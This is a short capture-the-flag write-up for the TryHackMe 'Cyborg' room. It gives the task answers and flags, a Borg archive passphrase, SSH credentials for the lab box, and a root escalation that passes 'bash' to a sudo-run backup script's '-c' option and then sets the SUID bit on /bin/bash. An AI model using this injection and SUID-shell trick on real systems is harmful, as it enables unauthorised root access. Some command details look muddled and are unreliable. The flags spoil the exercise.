# TryHackMe Cyborg

# Saikat Karmakar | Jan 28:2021

# Task 2 
1. can the machine, how many ports are open?
```
2
```
2. What service is running on port 22?
```
ssh
```
3. What service is running on port 80?
```
http
```
4. What is the user.txt flag?
```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```
5. What is the root.txt flag?
```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

-----------
***Notes***
-----------
downlaod borg 
https://github.com/borgbackup/borg

./borg list home/field/dev/final_archive/
passphrase = squidward

./borg extract home/field/dev/final_archive/::music_archive

ssh
```
user = alex
pass = S3cretP@s3
```

***Parsing bash script options with getopts***
https://sookocheff.com/post/bash/arsing-bash-script-arguments-with-shopts/
=================================================
to get the root: sudo -r root ./backup.sh -c bash
=================================================
```
-r role, --role=role
                 Run the command with an SELinux security context that includes the specified role.
```
```
while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done
```
=======================================================================
in the upper portion of the block whenever we pass a argument after c it'll execute it. if we pass bash after `-c` we'll exe. the bash as the super user(as we ran it using sudo -r root).


But whenever we run any command we don’t get any output stdout wasn’t working . The easiest was i found was to add a SUID bit on bash then exiting this shell and using bash binary to get root on the box.
--------------------
chmod 4577 /bin/bash
--------------------